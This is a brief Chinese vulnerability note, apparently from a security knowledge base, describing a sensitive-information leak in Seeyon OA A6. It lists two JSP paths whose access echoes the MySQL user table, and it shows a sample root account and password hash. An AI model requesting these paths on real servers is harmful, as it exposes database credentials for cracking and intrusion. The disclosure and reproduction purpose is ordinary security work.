致远OA A6 敏感信息泄露（一）
============================

一、漏洞简介
------------

该漏洞泄露了数据库用户的账号，密码hash。访问该文件直接执行了Select \*
from mysql.user;并回显

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

##### 漏洞位置:

    http://www.0-sec.org/yyoa/createMysql.jsp

    http://www.0-sec.org/yyoa/ext/createMysql.jsp

回显内容：

    root

    *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC
